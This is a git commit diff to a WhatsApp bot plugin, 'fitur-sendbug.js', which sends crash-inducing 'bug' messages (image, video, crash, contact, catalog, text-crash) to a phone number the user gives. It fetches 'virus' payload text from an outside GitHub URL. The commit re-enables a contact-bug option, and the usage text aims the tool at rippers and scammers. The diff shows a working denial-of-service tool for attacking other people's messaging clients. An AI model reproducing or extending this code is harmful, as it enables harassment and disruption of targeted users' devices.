bf653b7de14ad76ff6e7bae2f149bdb25e343c4d
wannjb <113450108+wannjb@users.noreply.github.com>
2022-11-06 19:23:37 +0800

    Update fitur-sendbug.js

--- plugins/fitur-sendbug.js
+++ plugins/fitur-sendbug.js
@@ -6,7 +6,7 @@ import { sticker } from '../lib/sticker.js'
 const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
 
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer`)
+	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer jangan pulak owner gw @${nomorown.split`@`[0]}`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
 	let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
@@ -25,7 +25,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
 			{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
 			{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
-			//{ title: 'BugKontak', rowId: `${_p + command} bugkontak ${text}` },
+			{ title: 'BugKontak', rowId: `${_p + command} bugkontak ${text}` },
 			{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
 			{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
 			{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
@@ -245,7 +245,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
 			throw false
 	}
-	m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
+	m.reply(`Berhasil Mengirim ${type} Di Nomer wa.me//${text}`)
 }
 
 handler.help = ['sendbugs <nomer>']
